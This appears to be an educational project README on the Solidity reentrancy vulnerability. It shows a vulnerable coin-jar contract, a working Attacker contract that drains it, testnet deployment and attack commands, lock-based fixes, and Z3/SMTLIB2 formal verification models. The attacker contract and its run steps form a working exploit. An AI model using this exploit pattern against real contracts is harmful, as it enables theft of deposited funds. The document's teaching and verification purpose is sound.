# Reentrancy vulnerability of smart contracts: formal verification for secure programming

The topic of this project is the reentrancy vulnerability of Solidity smart contracts.  We create a vulnerable smart contract, demonstrate how to exploit it, and apply formal verification to detect the vulnerability.  We also practice secure programming to fix the smart contract.  The safety of the improved smart contract is ensured through formal verification.

The solidity compiler solc equips rich formal verification features.
In order to carry it out for the reentrancy vulnerability, a programmer has to be aware of potential problems due to reentrancy and has to explicitly put assertions in a source code, that surely requires secure programming skills.  For this project, we don't suppose that programmers have such skills, and we are going to offer a prototypical solution for them, so that they get a warning of a presence of potential reentrancy vulnerability in their code without any prerequisite secure programming knowledge.  No warning means that there is no vulnerability and the smart contract is secure against the reentrancy vulnerability.

The rest of this document is organized as follows.  We first review what the reentrancy problem is.  There, we are going to see a running example of a vulnerable contract and an attacker contract, and a couple of security tips to prevent the problem.  Then we apply a formal verification technique due to an SMT solver Z3 by Microsoft to find that our contract is indeed vulnerable.  An automatically generated unsatisfiability proof due to Z3 contains a witness of the reentrancy vulnerability, which concretely illustrates a case of financial loss.  A secure programming workaround gets rid of the security vulnerability, and the safety of the fixed smart contract is ensured by formal verification.

The source codes for this project are available on github.

# Reentrancy attack

The reentrancy is a programming concept where a function call causes another function call to itself before the original function call ends.
In the context of smart contracts, a function which allows reentrancy can be a cause of security problem.  The reentrancy vulnerability of an Ethereum DAO has lead to a massive financial loss of $150M in 2016.

We take a look at a running example of a vulnerable Solidity smart contract and an attacker contract which exploits it.  We go through secure programming tips to get rid of the vulnerability.

## Vulnerable smart contract: Jar

The following Solidity code implements a coin jar.
The expected use case is that anybody can make a deposit, and anytime in the future, the depositor can withdraw the deposited money.
```
// SPDX-License-Identifier: CC-BY-4.0
pragma solidity >=0.8.0 <0.9.0;

contract Jar {

    mapping(address=>uint) public balance;

    constructor() payable {}

    function deposit() external payable {
        balance[msg.sender] += msg.value;
    }

    function withdraw() external {
        require(balance[msg.sender] != 0, "zero balance");
        (bool s,) = msg.sender.call{ value: balance[msg.sender] }("");
        require(s, "In Jar.withdraw(), call() failed.");
        balance[msg.sender] = 0;
    }
}
```
The state variable <code>balance</code> is an array of unsigned integers indexed by address.  It records which contract address has how much deposit.
The constructor does nothing, but is <code>payable</code>, namely, this contract may receive money through the deployment.
It has two external functions:
- <code>deposit</code> is to deposit cryptocurrency into this jar contract.
- <code>withdraw</code> is to withdraw one's deposit.

In <code>deposit</code>, the balance of the sender is increased by the amount of sent money by means of the following two objects,
- <code>msg.sender</code> is the address who made the current function call,
- <code>msg.value</code> is the amount of native cryptocurrency sent to the current function call.

In <code>withdraw</code>, the following functions are used:
- <code>require(b, s)</code> checks the first argument <code>b</code> of boolean type, and if it is false, the transaction is reverted with an error where the second argument <code>s</code> of string is enclosed.
- <code>a.call{ value: v}(m)</code> issues a call message <code>m</code> to the address <code>a</code> sending cryptocurrency which amounts to <code>v</code>.

It first checks that the balance is non-zero, then sends the deposit to <code>msg.sender</code>, the depositor.  Here, the return value of <code>call</code> is unpacked and only the first element, a boolean value indicating whether the call was successful, is taken.  If the transfer is successful the balance is reset to zero.  If the balance is zero at the beginning or the transfer has failed, the transaction is reverted.

The <code>call</code> function is commonly used to simply transfer cryptocurrency.  For this purpose, the empty call message, i.e. the nullstring (<code>""</code>), is specified.
In order to make a particular function call on the other hand, a call message in the abi format should be given instead of the nullstring (cf. https://solidity-by-example.org/call/).

A security problem may arise if <code>msg.sender</code> is a smart contract rather than an EOA (externally owned account).  Even if the call message is the null string, this invokes a payable function of the smart contract <code>msg.sender</code>.  The content of the payable function is in general unknown of course, and hence we have to assume an arbitrary smart contract code is executed.

We are going to see that we can create a malicious contract which can steal money from the Jar contract by repeatedly calling the <code>withdraw</code> function of the Jar contract.

## Attacking the vulnerable contract
The following smart contract is a successful attacker.
```
// SPDX-License-Identifier: CC-BY-4.0
pragma solidity >=0.8.0 <0.9.0;

interface IJar {
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker {

    IJar public jar;
    address public owner;

    constructor(address _jar) payable {
        jar = IJar(_jar);
        owner = msg.sender;
    }

    function prepare() public {
        jar.deposit{ value: 1 ether }();
    }

    function attack() public {
        jar.withdraw();
    }

    receive() external payable {
        if (address(jar).balance >= 1 ether) {
            jar.withdraw();
        }
    }

    function get() public {
        require (msg.sender == owner);
        (bool s, ) = owner.call{ value: address(this).balance}("");
        require (s);
    }
}
```
The interface <code>IJar</code> declares the functions defined in <code>Jar</code> and used to describe the contract <code>Attacker</code>.  The constructor of <code>Attacker</code> is payable and has one argument for the address; the address of the target Jar contract should be provided at the time of deployment.  The function <code>prepare</code> is to make a 1 ETH deposit of <code>Attacker</code> into <code>Jar</code>.  The function <code>attack</code> is to attack the target <code>Jar</code> contract.   The function <code>receive</code> is a special function.  It is the default receive function which is executed when somebody sent money to <code>Attacker</code> without specifying a function to invoke.
The function <code>get</code> is to send all the asset of <code>Attacker</code> to its deployer.

The usage of the <code>Attacker</code> contract is as follows.
An attacker deploys <code>Attacker</code>, providing the address of the target <code>Jar</code> and putting at least 1 ETH.  The attacker calls the function <code>prepare</code>; <code>Attacker</code> calls <code>deposit</code> of <code>Jar</code> sending 1 ETH, and hence <code>Attacker</code> has a deposit of 1 ETH in <code>Jar</code>.  Next, the attacker calls <code>attack</code>.  The execution goes to <code>withdraw</code> of <code>Jar</code>, and as the amount of <code>Attacker</code>'s deposit is 1 ETH, <code>Jar</code> proceeds to making a pay-out to <code>Attacker</code> by means of <code>call</code>.
In the course of <code>Attacker</code>'s receiving money, its <code>receive</code> function is executed.  It checks that the asset of <code>Jar</code> amounts to at least 1 ETH, and if so, it tries to further withdraw 1 ETH by calling <code>withdraw</code> of <code>Jar</code>, which causes the so-called <i>reentrancy</i>.
In <code>withdraw</code> of <code>Jar</code> the condition <code>balance[msg.sender] != 0</code> is still satisfied, and therefore <code>Jar</code> again sends 1 ETH to <code>Attacker</code>.  <code>Attacker</code> stops calling <code>withdraw</code> when the amount of the asset of <code>Jar</code> subceeds 1 ETH, and the whole transaction is successfully over without a revert.

## Secure programming to prevent reentrancy

We discuss a couple of workarounds to prevent the above mentioned problem.
A commonly suggested cure for the vulnerability is to make use of a lock to prohibit the reentrancy.  Changing the balance before invoking <code>call</code> is also a solution.

### Lock

A lock object creates a critical region in the source code to prevent an unexpected reentrancy.  A lock object is implemented via a boolean.  Before entering a critical region, it checks the lock.  If the lock is false, it indicates that the critical region is not locked, and one may enter the region, switching the lock to true.  After getting out of the region, the lock is reset to false.  As long as the lock is true, it is not allowed to newly enter the critical region.
In the <code>Jar</code> contract, the line of <code>msg.sender.call</code> should be a crucial part of the critical region.
An easy way of implementing it is to use <code>ReentranceGuard</code> of openzeppelin (https://github.com/binodnp/openzeppelin-solidity/blob/master/docs/ReentrancyGuard.md).
They provide a modifier <code>nonReentrant</code> which should be applied to a function.  In our example, <code>withdraw</code> should get this modifier, so that the whole content, surely including the above mentioned critical line, is under the control of the lock object.
<code>Attacker</code> fails to steal money, because in the first reentrancy (i.e. the second time call of <code>withdraw</code>), the reentrancy is detected and the whole transaction is reverted.

The fixed <code>Jar</code> contract looks as follows.
```
// SPDX-License-Identifier: CC-BY-4.0
pragma solidity >=0.8.0 <0.9.0;

contract Jar {
    mapping(address=>uint) public balance;
    bool locked;
    constructor() payable {}

    function deposit() public payable {
        balance[msg.sender] += msg.value;
    }

    function withdraw() public {
        require(!locked, "withdraw(): reentrancy not allowed");
        locked = true;
        require(balance[msg.sender] != 0, "zero balance");
        (bool s,) = msg.sender.call{ value: balance[msg.sender] }("");
        require(s, "In Jar.withdraw(), call() failed.");
        balance[msg.sender] = 0;
	    locked = false;
    }
}
```
### Updating the critical value before transfer

Another solution particularly applicable to our case is to set zero for <code>balance[msg.sender]</code> immediately after checking the non-zero and before the transfer.  By this change, the deposit of the attacker is already zero in the reentrancy call, and hence the whole transaction is reverted.

### Underflow

In Solidity version 0.8 and above, arithmetic operations revert on underflow.  Consider the following version of <code>withdraw</code>.
```
function withdraw() public {
    uint amount = balance[msg.sender];
    require(amount != 0, "zero balance");
    (bool s,) = msg.sender.call{ value: amount }("");
    require(s, "In Jar.withdraw(), call() failed.");
    balance[msg.sender] -= amount;
}
```
Instead of putting zero for the balance, it subtracts the amount of transfer, where <code>amount</code> is defined at the very beginning.  After <code>Attacker</code> stopped withdrawal, the repeated subtraction causes an arithmetical underflow, because <code>balance[msg.sender]</code> is of type unsigned integer.  In case of reentrancy, the whole transaction is reverted, and the contract is secure against <code>Attacker</code>.

## Demonstration

We demonstrate the reentrancy vulnerability and also secure programming within the Hardhat environment, on an actual blockchain, and on the Remix IDE.
<!-- The full source code relies on various technologies such as solidity, hardhat, and ethers.js, and the demonstration is done on Sepolia test net as well as on the remix IDE (https://remix.ethereum.org/).

TODO: describe further contents. -->

### Hardhat

Hardhat offers a local environment for smart contract development, where one can compile, deploy, and test smart contracts.

We assume npm is available.
You move to your project's directory, then the following commands install and set up Hardhat and other packages such as ethers.js@v6.
```
% npm install --save-dev --legacy-peer-deps hardhat
% npm install --legacy-peer-deps @nomiclabs/hardhat-waffle ethereum-waffle chai @nomiclabs/hardhat-ethers ethers dotenv
% npm init -y
% npx hardhat
```
The last command starts an interactive set up program, where you choose the javascript project and say yes to everything else.

Let's see how the test script goes.
```
% npx hardhat test test/Attacker.js


  Reentrancy vulnerability
Jar deployed at 0x5FbDB2315678afecb367f032d93F642f64180aa3
Attacker deployed at 0x8464135c8F25Da09e49BC8782676a84730C318bC

Jar's ETH balance 10.0
Attacker's ETH balance 1.0
Attacker's ETH deposit in Jar 0.0

* Call to Attacker.prepare()
Jar's ETH balance 11.0
Attacker's ETH balance 0.0
Attacker's ETH deposit in Jar 1.0

* Call to Attacker.attack()
Jar's ETH balance 0.0
Attacker's ETH balance 11.0
Attacker's ETH deposit in Jar 0.0
    ✔ Attacker successfully attacks Jar (736ms)


  1 passing (741ms)
```
The first line is the npx command one has to issue.
Then the test script, `test/Attacker.js` does the following steps
1. Deploys the Jar contract, sending 10 ETH to it.
2. Deploys the Attacker contract, supplying the Jar contract's address to the constructor and also sending 1 ETH.
3. It prints out the addresses of the contracts and their status.
4. Calls `prepare()` function of Attacker.  It let Attacker make 1 ETH deposit into Jar.
5. It prints out the status.
6. Calls `attack()` function of Attacker.  It makes use of the reentrancy vulnerability of Jar, and moves all the asset of Jar to Attacker.

The secured Jar contract isn't vulnerable anymore, as the following test result shows that the Attacker's attempt has been foiled.
```
% npx hardhat test test/Secure.js


  Reentrancy vulnerability
JarLocked deployed at 0x5FbDB2315678afecb367f032d93F642f64180aa3
Attacker deployed at 0x8464135c8F25Da09e49BC8782676a84730C318bC

JarLocked's ETH balance 10.0
Attacker's ETH balance 1.0
Attacker's ETH deposit in JarLocked 0.0

* Call to Attacker.prepare()
JarLocked's ETH balance 11.0
Attacker's ETH balance 0.0
Attacker's ETH deposit in JarLocked 1.0

* Call to Attacker.attack()
JarLocked's ETH balance 11.0
Attacker's ETH balance 0.0
Attacker's ETH deposit in JarLocked 1.0
    ✔ Attacker fails to attack JarLocked (972ms)


  1 passing (977ms)
```
In this test script, it expects that `attack()` causes a revert. It indeed happens, and the asset of Jar is secured.

### On blockchain

We make use of the alchemy API for the demonstration on Sepolia test net.
We assume you have done the Hardhat installation procedure written in the above subsection on Hardhat.

In the directory `js`, you find the following scripts:
```
attacker-asset-balance.js
attacker-attack.js
attacker-get.js
attacker-prepare.js
deploy-attacker.js
deploy-jar.js
jar-asset-balance.js
jar-deposit-balance.js
```
Those scripts are prepared to carry out the demonstration.
It relies on additional information provided by the file `.env` at the project root containing
```
SEPOLIA_URL=https://eth-sepolia.g.alchemy.com/v2/XXXXXXX
PRIVATE_KEY=0xXXXXXXXX
API_KEY=XXXXXXXX
JAR_ADDRESS=
ATTACKER_ADDRESS=
```
where the first three should come from your alchemy API account page.
The last two are vacant at the beginning, and you are going to manually fill in them through the deployment process.
In the github repository, you find the file `.env.dummy` for the template to create `.env`.

Even in case you have limited amount of test ethers, you can go through the demonstration by modifying the following numbers.

1. In `contract/Attacker.sol` two occurrences of `1 ether` can be smaller, eg. `0.01 ether`.
2. In `js/deploy-jar.js` the definition of `initialBalance` can be changed, eg. `0.02 ether`.
3. In `js/deploy-attacker.js` and the definition of `initialBalance` can be changed, eg. `0.01 ether`.

At the root directory of the project, issue the following command
```
% npx hardhat run js/deploy-jar.js
```
This deploys the Jar contract, and prints a line containing the address of the deployed contract.  Copy the address and fill out the corresponding entry in the `.env` file.
Issue the following command to deploy the attacker.
```
% npx hardhat run js/deploy-attacker.js
```
It reads the address of the deployed Jar contract from `.env`, and supply it to the constructor of Attacker.
You see the message containing the address of the deployed attacker contract.  Copy the address and fill out the corresponding entry in the `.env` file.

The process of the deployment has been done, and we are going to see the reentrancy vulnerability by now.
Issue the following command to call `Attacker.prepare()`
```
% npx hardhat run js/attacker-prepare.js
```
The attacker contract makes a deposit into the jar contract.
You can now see how the balances are.
```
% npx hardhat run js/jar-asset-balance.js
Jar's ETH asset balance amounts to 0.03
% npx hardhat run js/jar-deposit-balance.js
Attacker's deposit in Jar amounts to 0.01
% npx hardhat run js/attacker-asset-balance.js
Attacker's ETH asset balance amounts to 0
```
Note that `jar-deposit-balance.js` displays the deposit balance of attaker in the jar contract.

Issue the following command to call `Attacker.attack()`
```
% npx hardhat run js/attacker-attack.js
```
The attacker contract attacks the jar contract and withdraw `0.03 ETH` rather than its actual deposit `0.01 ETH`
```
% npx hardhat run js/jar-asset-balance.js
Jar's ETH asset balance amounts to 0
% npx hardhat run js/jar-deposit-balance.js
Attacker's deposit in Jar amounts to 0
% npx hardhat run js/attacker-asset-balance.js
Attacker's ETH asset balance amounts to 0.03
```
By issueing the following command, one can move the asset of the attacker to its deployer.
```
% npx hardhat run js/attacker-get.js
```

On the other hand, a secured version of Jar is deployed by the folloing command
```
% npx hardhat run js/deploy-jarlocked.js
```
The rest of the procedure is same, using the other js codes, and one can see that the attacker's attempt is foiled.
### Remix IDE

The Remix IDE is a browser based online IDE for smart contract development.
Just opening https://remix.ethereum.org/ , anyone can start coding, without any preparation/installation on a local computer.
You can start the demonstration for the reentrancy vulnerability by importing from github the following URLs
```
https://github.com/miyamok/reentrancy/blob/main/contracts/Jar.sol
https://github.com/miyamok/reentrancy/blob/main/contracts/Attacker.sol
```
Consult details for the Remix documentation and tutorials.

# Formal verification

We apply formal verification in order to detect the reentrancy vulnerability of the vulnerable jar contract and also to ensure the safety of a secure jar contract thanks to a lock object.  We manually formalized a model of the contracts, and use it to find a possible reentrancy which causes an unexpected change of persistent data, such as state variables of the contract and its asset balance of the native cryptocurrency.  The safety property to check is that any change of persistent data is deterministic, namely, the execution results are independent from unknown external contracts.  In case the security property is violated, we get an evidence showing how it happens.

The solc compiler has rich features for formal verifications.   In order to detect a reentrancy vulnerability by means of these solc features, a programmer has to put additional assertions properly, which has to be based on security knowledges.
Our case study of formal verification indeed works to the above shown vulnerable smart contract without an additional assertions.  Needless to say, a programmer is not required to know about security, either.
Currently (as of June 2024) solc doesn't offer a feature automatically to detect reentrancy vulnerability without explicit assertions in source code.

We practice formal verification through SMT solver Microsoft's Z3, and we use SMTLIB2 for SMT modeling.  The following codes are used.

- Solidity code of the vulnerable smart contract ([Jar.sol](Solidity/Jar.sol))
- Solidity code of the attacker smart contract ([Attacker.sol](Solidity/Attacker.sol))
- SMTLIB2 model of the vulnerable smart contract and the security property ([jar.smt](smt/jar.smt))
- Solidity code of the secure smart contract due to lock ([Jar_locked.sol](Solidity/Jar_locked.sol))
- SMTLIB2 model of the secure smart contract and the security property ([jar_locked.smt](smt/jar_locked.smt))

## Formal modeling

We have given formal models of Jar.sol and Jar_locked.sol within the framework of the constrained Horn clause (CHC).  CHC is employed by the official solc compiler for the built-in formal verification [[1]](#1) [[2]](#2).  The novelty of our work is that verification concerning the reentrancy vulnerability is carried out without additional assertions which have to be inserted into a source code by a programmer with security knowledges.

We describe how the above mentioned <code>Jar</code> contract is modeled in the SMTLIB2 format which SMT solvers such as Z3 accept as input.  The modeling of the contract follows existing research papers [[2]](#2).

### Sorts

We use the following custom sorts for address, uint, and mapping(address=>uint).
```
(define-sort A () (_ BitVec 256)) ;address
(define-sort BUINT () (_ BitVec 256)) ; bounded 256bit unsigned integer
(define-sort M () (Array A BUINT)) ;mapping from address to Int
```
Bitvector is used to represent 256 bit fixed size data, which is exactly uint256 of Solidity.
### Predicate declarations
We declare the following predicates, i.e. boolean valued functions, in Z3 to model the Solidity functions deposit() and withdraw(), the external behavior of <code>Jar</code>, and the states of <code>Jar</code>.
```
(declare-fun P_alpha (M A BUINT BUINT M A BUINT BUINT Int) Bool)
(declare-fun P_omega (M A BUINT BUINT M A BUINT BUINT Int) Bool)
(declare-fun Q_alpha (M A BUINT BUINT M A BUINT BUINT Int) Bool)
(declare-fun Q_1 (M A BUINT BUINT M A BUINT BUINT Int) Bool)
(declare-fun Q_2 (M A BUINT BUINT M A BUINT BUINT Int) Bool)
(declare-fun Q_3 (M A BUINT BUINT M A BUINT BUINT Int) Bool)
(declare-fun Q_omega (M A BUINT BUINT M A BUINT BUINT Int) Bool)
(declare-fun S (M BUINT A BUINT M BUINT Int) Bool)
(declare-fun T (M BUINT A BUINT M BUINT Int) Bool)
(declare-fun Ext (M BUINT M BUINT) Bool)
(declare-fun Jar (M BUINT) Bool)
(declare-fun Init (M BUINT) Bool)
```
### Modeling `deposit`
<code>deposit</code> is modeled by `P_alpha`, `P_omega`, and `S`.
We represent the program execution as step by step state transitions.
The function body of `deposit` consists of one line, and it is representable as one step execution, hence it suffices to have two states to present a transition system.
```
    function deposit() public payable {
        balance[msg.sender] += msg.value;
    }
```
The two functions `P_alpha` and `P_omega` stands for the state before the line and the state after the line, respectively.  On the other hand, `S` is to model state updates due to running throughout `deposit` and stands for summary.  In principle, it determines whether there was a revert during the function execution, and if so, it restores the original states to cancel the transaction, and otherwise, it updates the states.  Here we show the Horn clauses for `P_alpha`, `P_omega`, and `S` in SMTLIB2.

TODO: maybe, clarifying the distinction between constrained Horn clause and Horn clause.
```
(assert
 (forall ((b M) (l_b M) (s A) (l_s A) (v BUINT) (l_v BUINT) (l_r Int)
	  (tb BUINT) (l_tb BUINT))
	 (=> (and (= b l_b) (= s l_s) (= v l_v) (bvule buint0 v) (= l_r 0)
		  (= l_tb (bvadd tb l_v)) (bvule tb l_tb) (bvule l_v l_tb))
	     (P_alpha b s v tb l_b l_s l_v l_tb l_r))))

(assert
 (forall ((b M) (l_b M) (s A) (l_s A) (v BUINT) (l_v BUINT) (l_r Int)
	  (tb BUINT) (l_tb BUINT) (l_b^ M))
	 (=> (and (P_alpha b s v tb l_b l_s l_v l_tb l_r)
		  (= l_b^ (store l_b l_s (bvadd (select l_b l_s) l_v)))
		  (bvule (select l_b l_s) (select l_b^ l_s))
		  (bvule l_v (select l_b^ l_s)))
	     (P_omega b s v tb l_b^ l_s l_v l_tb l_r))))

(assert
 (forall ((b M) (l_b M) (s A) (l_s A) (v BUINT) (l_v BUINT) (l_r Int)
	  (tb BUINT) (l_tb BUINT) (b^ M) (tb^ BUINT) (r Int))
	 (=> (and (P_omega b s v tb l_b l_s l_v l_tb l_r)
		  (=> (not (= l_r 0)) (and (= b^ b) (= tb^ tb)))
		  (=> (= l_r 0) (and (= b^ l_b) (= tb^ l_tb)))
		  (= r l_r))
	     (S b tb s v b^ tb^ r))))
```
Let's see what the arguments of `P_alpha` and `P_omega` are.  `b` models the Solidity state variable `balance` of type `mapping(address=>uint)`, `s` models `msg.sender`, the address of the sender, `v` models `msg.value`, the amount of the native cryptocurrency sent from the sender to this contract for the call to `deposit`, and `tb` models `this.balance`, the balance of the native cryptocurrency this contract owns.
The original values of these variables `b`, `s`, `v`, and `tb` will be updated by the summary `S` only if the function call is over without a revert.  The variables with the prefix `l_` (standing for local) are to record intermediate changes, and are used to update states if there is no revert, and are discarded in case of a revert.  `P_alpha` is in charge of initialization.  There, `l_b`, `l_s`, `l_v`, and `l_tb` are initialized by the corresponding values.  Note that `deposit` is a payable function and the balance of this contract is increased by `msg.value`, that is modeled by the equational constraints on `tb` etc., where overflow is also handled properly.  Here, `bvadd` is a function for addition of bitvectors, and `bvule` is the less than relation taking bitvectors as unsigned integers.
`l_r` keeps the intermediate revert status, which is initialized as 0 (no error).
The function body of `deposit` consists of just one line.  An execution of this line makes a transition from `P_alpha` to `P_omega`.  The equational constraint comes straightforwardly to describe the state after the execution.  Here we use arithmetic for arrays, that involves operations `select` and `store`.  `select` takes two arguments, an array and an index, and returns a value at the index.  `store` takes three arguments, an array, an index, and a value, and returns a new array where the value at the index has been updated to be the given value.
The Solidity shared variable `balance` is increased by the sent value from a caller.  Note that overflow is handled as well.
`S` is to check whether the function execution reached its end, `P_omega`, with any revert or not, and in case there is a revert, i.e. `l_r` is non-zero, it restores the original states to cancel the transaction, and otherwise, it updates states by `l_` prefixed-variables.
The arguments `b^` and `bt^` are in charge of the states when the execution is over.
### Modeling `withdraw` and the external behavior of `Jar`
Let's move on to the model of `withdraw` which relies on the notion of external behavior of the contract `Jar`.  The external behavior is the key notion to model how an unknown smart exploits the vulnerability of `Jar`.
We model `withdraw` as follows.
```
(assert
 (forall ((b M) (l_b M) (s A) (l_s A) (v BUINT) (l_v BUINT) (l_r Int)
	  (tb BUINT) (l_tb BUINT))
	 (=> (and (= b l_b) (= s l_s) (= v l_v) (= l_r 0) (= l_tb tb))
	     (Q_alpha b s v tb l_b l_s l_v l_tb l_r))))

(assert
 (forall ((b M) (l_b M) (s A) (l_s A) (v BUINT) (l_v BUINT) (l_r Int)
	  (tb BUINT) (l_tb BUINT))
	 (=> (and (Q_alpha b s v tb l_b l_s l_v l_tb l_r)
		  (not (= (select l_b l_s) buint0)))
	     (Q_1 b s v tb l_b l_s l_v l_tb l_r))))

(assert
 (forall ((b M) (l_b M) (s A) (l_s A) (v BUINT) (l_v BUINT) (l_r Int)
	  (tb BUINT) (l_tb BUINT) (l_tb^ BUINT))
	 (=> (and (Q_1 b s v tb l_b l_s l_v l_tb l_r)
		  (= l_tb^ (bvsub l_tb (select l_b l_s)))
		  (bvule (select l_b l_s) l_tb))
	     (Q_2 b s v tb l_b l_s l_v l_tb^ l_r))))

(assert
 (forall ((b M) (l_b M) (l_b^ M) (s A) (l_s A) (v BUINT) (l_v BUINT) (l_r Int)
	  (tb BUINT) (l_tb BUINT) (l_tb^ BUINT) (b^ M) (tb^ BUINT) (b^^ M) (tb^^ BUINT))
	 (=> (and (Q_2 b s v tb l_b l_s l_v l_tb l_r)
		  (and (Ext b^ tb^ b^^ tb^^)
		       (= b^ l_b) (= b^^ l_b^)
		       (= tb^ l_tb) (= tb^^ l_tb^)))
	     (Q_3 b s v tb l_b^ l_s l_v l_tb^ l_r))))

(assert
 (forall ((b M) (l_b M) (s A) (l_s A) (v BUINT) (l_v BUINT) (l_r Int)
	  (tb BUINT) (l_tb BUINT) (l_b^ M))
	 (=> (and (Q_3 b s v tb l_b l_s l_v l_tb l_r)
		  (= l_b^ (store l_b l_s buint0)))
	     (Q_omega b s v tb l_b^ l_s l_v l_tb l_r))))


(assert
 (forall ((b M) (l_b M) (s A) (l_s A) (v BUINT) (l_v BUINT) (l_r Int)
	  (tb BUINT) (l_tb BUINT) (b^ M) (tb^ BUINT) (r Int))
	 (=> (and (Q_omega b s v tb l_b l_s l_v l_tb l_r)
		  (=> (not (= l_r 0)) (and (= b^ b) (= tb^ tb)))
		  (=> (= l_r 0) (and (= b^ l_b) (= tb^ l_tb)))
		  (= r l_r))
	     (T b tb s v b^ tb^ r))))
```
`Q_alpha` is for the initial step.  `Q_1` is derived if the condition <code>balance[msg.sender] != 0</code> holds.  We model the next line of `call`, splitting it into two steps, where the first step `Q_2` is to send the native currency to `msg.sender` and the second one `Q_3` is to process the call message.  For simplicity we consider only the case that `call` is always successful.  This simplification is harmless because in case `call` is not successful, it is reverted by `require`, and it doesn't affect the safety property.  Note that we should explicitly handle a revert if `assert` was used here instead of `require` in the Solidity code.  `Q_omega` comes after the last line to set zero for `balance[msg.sender]`.  `T` is a summary predicate for `withdraw`.

There are two new elements, one is a new function `bvsub` for the subtraction in bitvectors.  The other is a predicate `Ext` which models an external behavior of `Jar`.
```
(assert (forall ((b M) (tb BUINT)) (Ext b tb b tb)))

(assert (forall ((b M) (s A) (v BUINT) (r Int)
		 (tb BUINT) (b^ M) (tb^ BUINT) (b^^ M) (tb^^ BUINT))
		(=> (and (Ext b tb b^ tb^)
			 (S b^ tb^ s v b^^ tb^^ r)
			 (= r 0))
		    (Ext b tb b^^ tb^^))))

(assert (forall ((b M) (s A) (v BUINT) (r Int)
		 (tb BUINT) (b^ M) (tb^ BUINT) (b^^ M) (tb^^ BUINT))
		(=> (and (Ext b tb b^ tb^)
			 (T b^ tb^ s v b^^ tb^^ r)
			 (= r 0))
		    (Ext b tb b^^ tb^^))))
```
An unknown external function is arbitrary in general, and it can involve calls to the public or external functions of any other contracts including `Jar`.  The idea is to abstractly model how such an unknown function affects <code>Jar</code>.  `Ext` is defined as a boolean valued function which takes four arguments.  The first two represents a state which consists of `b` and `tb`, i.e. the state variable `balance` and the amount of the native asset, `this.balance`, of <code>Jar</code>.  In principle, here we should list all publicly available data of the contract relevant to the formal analysis.  The other two arguments represent a possible future state of `Jar` as a result of executing an unknown function, which may involve function calls to `deposit` and `withdraw`.  The above three Horn clauses represent the case where no external behavior changing the states and the cases where `deposit` and `withdraw` caused external behaviors, respectively.

Now we are able to discuss the Horn clause of `Q_3` (same as above)
```
(assert
 (forall ((b M) (l_b M) (l_b^ M) (s A) (l_s A) (v BUINT) (l_v BUINT) (l_r Int)
	  (tb BUINT) (l_tb BUINT) (l_tb^ BUINT) (b^ M) (tb^ BUINT) (b^^ M) (tb^^ BUINT))
	 (=> (and (Q_2 b s v tb l_b l_s l_v l_tb l_r)
		  (and (Ext b^ tb^ b^^ tb^^)
		       (= b^ l_b)
		       (= b^^ l_b^)
		       (= tb^ l_tb)
		       (= tb^^ l_tb^)))
	     (Q_3 b s v tb l_b^ l_s l_v l_tb^ l_r))))
```
This models that `l_b` and `l_tb` came from `Q_2` goes to any `l_b^` and `l_tb^` satisfying `Ext l_b l_tb l_b^ l_tb^`, that means the state of `l_b` and `l_tb` goes to another state of `l_b^` and `l_tb^` due to a transition due to an external behavior.
### Modeling the smart contract `Jar`
Considering the lifetime of smart contracts, it has the initial state and states reachable from the initial one through transactions.  This is modeled by `Init` and `Jar` as follows, assuming `zeros` is an empty mapping (all values are zero).  `tb` is arbitrary and represents that it may receive any amount of native asset through the deployment, as the constructor of `Jar` is payable.  `Jar` represents the contract's state, which is understood as a tree whose root is of the initial state, and branches are formed due to one step transition without a revert.
```
(assert (forall ((tb BUINT)) (Init zeros tb)))

;; Jar
(assert (forall ((b M) (tb BUINT)) (=> (Init b tb) (Jar b tb))))

(assert
 (forall ((b M) (s A) (v BUINT) (tb BUINT) (b^ M) (tb^ BUINT) (r Int))
	 (=> (and (Jar b tb)
		  (T b tb s v b^ tb^ r)
		  (= r 0))
	     (Jar b^ tb^))))

(assert
 (forall ((b M) (s A) (v BUINT) (tb BUINT) (b^ M) (tb^ BUINT) (r Int))
	 (=> (and (Jar b tb)
		  (S b tb s v b^ tb^ r)
		  (= r 0))
	     (Jar b^ tb^))))
```
### Modeling the security property
The smart contract `Jar` has been formally modeled.
We are at the last step to model the security property as follows.
```
(assert
 (forall ((b M) (tb BUINT) (s A) (v BUINT)
          (b^ M) (tb^ BUINT) (r^ Int)
          (r_^ Int) (b_^ M) (tb_^ BUINT))
         (not (and (Jar b tb)
                   (T b tb s v b^ tb^ r^)
                   (T b tb s v b_^ tb_^ r_^)
                   (= r^ 0)
                   (= r_^ 0)
                   (not (and (= b^ b_^)
                             (= tb^ tb_^)))))))
```
This Horn clause represents the property that result of a call to `withdraw` is deterministic. 
In case this property is violated, a call to `withdraw` yields different results depending on an unknown external contracts.  The SMT solver answers `unsat` and gives a proof log which witnesses two distinct results which can be yielded by a function call.

Our security property is not very optimal in the sense that it causes false positive in the detection of the reentrancy vulnerability, as one call to `deposit` on one hand and nothing to call on the other hand can violate the property.  It is better to make use of an invariance concerning the balances, and specify for example that the difference between the total amount of deposits and the amount of native asset of the contract is constant.  However, for the moment, we employ the above mentioned assertion due to the following reasons, and consider some variations of the model, such as only `withdraw` is allowed for an external call from an unknown contract, in order to find a vulnerability result.

- Automatic generation of an invariance is not straightforward in a general case.
- We have faced a limit of computational power of the machine in case the above mentioned use of the invariance was employed (still non-terminating in half a day of Z3 execution).  We prefer to keep the problem manageable in seconds, and we need an optimization to overcome this issue.

We leave them for future work.
## Experiment

We are going to see how to practice formal verification by means of the SMT solver Z3.  Z3 is particularly advantageous for our verification work thanks to its integration with another software Spacer which is specialized for Horn clause solving.  If the model in conjunction with the security property is satisfiable, the contract is secure.  If it is unsatisfiable, Z3/Spacer provides a proof which witnesses the violation of the security property.  At the end, we read off an evidence showing that our jar contract causes a financial loss due to the reentrancy vulnerability as follows:

- Assume the contract has the state `([1], 3)`, where the singleton array `[1]` means that the account of index 0 has its deposit which amounts to 1 and `3` means that the jar contract's asset amounts to 3.
- Distinct transactions may happen when the account of the index 0 calls `withdraw`:
    - the state of the contract ends up with `([0], 1)`
    - the state of the contract ends up with `([0], 2)`
- Although `withdraw` is supposed to pay back to the caller the exact amount of the deposit, that is 1, the contract may pay back 2.
- This divergence comes through a call to <code>msg.sender.call</code> in <code>withdraw</code>.

It required some modification of the model, in order to get the above vulnerability scenario, for instance, deactivating a Horn clause describing the external behavior of Jar due to the <code>deposit</code> function which is indeed innocent.
Executing Z3 for the model and the security property mentioned in the previous sections without a modification, we didn't get an answer from Z3 in a reasonable time consumption (after half a day, we gave up).
